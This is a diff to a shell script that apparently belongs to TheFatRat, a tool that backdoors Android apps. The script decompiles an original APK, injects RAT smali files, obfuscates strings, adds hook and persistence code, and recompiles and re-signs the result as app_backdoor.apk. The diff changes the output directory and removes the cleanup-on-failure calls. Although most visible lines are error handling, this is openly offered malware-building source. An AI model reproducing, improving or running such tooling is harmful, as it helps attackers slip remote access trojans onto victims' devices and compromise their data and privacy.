@@ -33,6 +33,7 @@ JARSIGNER=`sed -n 5p $file`
 APKTOOL=`sed -n 11p $file`
 DX=`sed -n 9p $file`
 ZIPALIGN=`sed -n 8p $file`
+output=$(sed -n 17p ${file})
 ASO="$path/tools/android-string-obfuscator/lib/aso"
 else
 	echo -e $red"Configuration file does not exists , run setup.sh first for config ."
@@ -124,11 +125,6 @@ function hook_smali_file {
     echo "Failed to hook smali file" >>$LOG_FILE 2>&1
     return 1
   fi
-}
-
-function cleanup {
-  echo "Forcing cleanup due to a failure or error state!" >>$LOG_FILE 2>&1
-  bash cleanup.sh >>$LOG_FILE 2>&1
 }
 
 function verify_orig_apk {
@@ -232,7 +228,6 @@ rc=$?
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to decompile original APK file"
-  cleanup
   exit $rc
 fi
 
@@ -248,7 +243,6 @@ rc=$?
 if [ $rc != 0 ]; then
   echo "done."
   echo "[!] Failed to locate smali file to hook"
-  cleanup
   exit $rc
 else
   echo "done."
@@ -275,7 +269,6 @@ rc=$?
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to decompile RAT APK file"
-  cleanup
   exit $rc
 fi
 
@@ -306,7 +299,6 @@ elif [ "$PERM_OPT" == "KEEPO" ]; then
   echo "[+] Keeping permissions of original project"
 else
   echo "[!] Something went terribly wrong..."
-  cleanup
   exit 1
 fi
 
@@ -319,7 +311,6 @@ rc=$?
 if [ $rc != 0 ]; then
   echo "done."
   echo "[!] Failed to run dx on Java class files"
-  cleanup
   exit $rc
 fi
 $BAKSMALI d -o $MY_PATH/temp/bin/classes/smali $MY_PATH/temp/bin/classes/classes.dex >>$LOG_FILE 2>&1
@@ -327,7 +318,6 @@ rc=$?
 if [ $rc != 0 ]; then
   echo "done."
   echo "[!] Failed to run baksmali on classes.dex created for Java class files"
-  cleanup
   exit $rc
 fi
 cp -v -r $MY_PATH/temp/bin/classes/smali/* $MY_PATH/temp/payload/smali >>$LOG_FILE 2>&1
@@ -335,7 +325,6 @@ rc=$?
 if [ $rc != 0 ]; then
   echo "done."
   echo "[!] Failed to inject smali files dervied from Java classes"
-  cleanup
   exit $rc
 fi
 echo "done."
@@ -350,7 +339,6 @@ rc=$?
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to create new directory for RAT smali files"
-  cleanup
   exit $rc
 else
   echo "[+] Inject package path: $inject_package_path"
@@ -406,7 +394,6 @@ fi
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to copy RAT smali files"
-  cleanup
   exit $rc
 fi
 
@@ -446,7 +433,6 @@ fi
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to fix RAT smali files"
-  cleanup
   exit $rc
 fi
 
@@ -565,7 +551,6 @@ fi
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to obfuscate const-string values in RAT smali files"
-  cleanup
   exit $rc
 fi
 
@@ -575,7 +560,6 @@ rc=$?
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to add hook"
-  cleanup
   exit $rc
 fi
 
@@ -605,7 +589,6 @@ if [ $rc == 0 ]; then
   echo "done."
   if [ $rc != 0 ]; then
     echo "[!] Failed to add persistence hook"
-    cleanup
     exit $rc
   fi
 else
@@ -618,7 +601,6 @@ rc=$?
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to recompile original project with backdoor"
-  cleanup
   exit $rc
 fi
 
@@ -659,7 +641,6 @@ fi
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to generate RSA key"
-  cleanup
   exit $rc
 fi
 
@@ -669,7 +650,6 @@ rc=$?
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to sign recompiled APK"
-  cleanup
   exit $rc
 fi
 
@@ -679,7 +659,6 @@ rc=$?
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to verify signed artifacts"
-  cleanup
   exit $rc
 fi
 
@@ -691,7 +670,6 @@ rc=$?
 echo "done."
 if [ $rc != 0 ]; then
   echo "[!] Failed to align recompiled APK"
-  cleanup
   exit $rc
 fi
 
@@ -711,25 +689,25 @@ fi
 
 #looking if already exists a previous backdoor apk created and renaming it
 ren=`shuf -i 1-1000 -n 1`
-back="$HOME/Fatrat_Generated/app_backdoor.apk"
+back="$output/app_backdoor.apk"
 if [ -f "$back" ]
 then
-mv $HOME/Fatrat_Generated/app_backdoor.apk $HOME/Fatrat_Generated/app_backdoor_$ren.apk
+mv $output/app_backdoor.apk $output/app_backdoor_$ren.apk
 echo -e $yellow ""
 echo "FatRat Detected that you already had a previous created backdoor
-file in ($HOME/Fatrat_Generated/) with the name app_backdoor.apk ."
+file in ($output/) with the name app_backdoor.apk ."
 echo -e $blue ""
 echo "FatRat have renamed your old backdoor to app_backdoor_$ren.apk"
 
 #Moving finished backdoor file to final destination
-mv $MY_PATH/temp/original/dist/app.apk $HOME/Fatrat_Generated/app_backdoor.apk > /dev/null 2>&1
+mv $MY_PATH/temp/original/dist/app.apk $output/app_backdoor.apk > /dev/null 2>&1
 echo -e $green ""
 echo "Your RAT apk was successfully builded and signed , it is located here :
  ~/Fatrat_Generated/app_backdoor.apk"
 rm -rf temp/* > /dev/null 2>&1
 echo ""
 else
-mv $MY_PATH/temp/original/dist/app.apk $HOME/Fatrat_Generated/app_backdoor.apk > /dev/null 2>&1
+mv $MY_PATH/temp/original/dist/app.apk $output/app_backdoor.apk > /dev/null 2>&1
 echo -e $green ""
 echo "Your RAT apk was successfully builded and signed , it is located here :
  ~/Fatrat_Generated/app_backdoor.apk"
